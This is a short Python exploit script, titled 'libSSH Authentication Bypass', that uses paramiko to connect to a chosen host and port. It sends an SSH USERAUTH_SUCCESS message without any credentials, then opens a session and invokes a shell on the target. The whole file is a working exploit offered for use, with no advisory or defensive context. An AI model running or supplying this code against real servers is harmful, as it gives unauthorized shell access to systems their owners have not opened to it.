#!/usr/bin/env python3
import paramiko
import socket
import argparse
from sys import argv, exit


parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port):
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        spawncmd = transport.open_session()
        spawncmd.invoke_shell()
        return 0
    
    except paramiko.SSHException as e:
        print("TCPForwarding disabled on remote/local server can't connect.")
        return 1
    except socket.error:
        print("Unable to connect.")
        return 1


def main():
    try:
        hostname = args.host
        port = args.port
    except:
        parser.print_help()
    BypasslibSSHwithoutcredentials(hostname, port)

if __name__ == '__main__':
    exit(main())
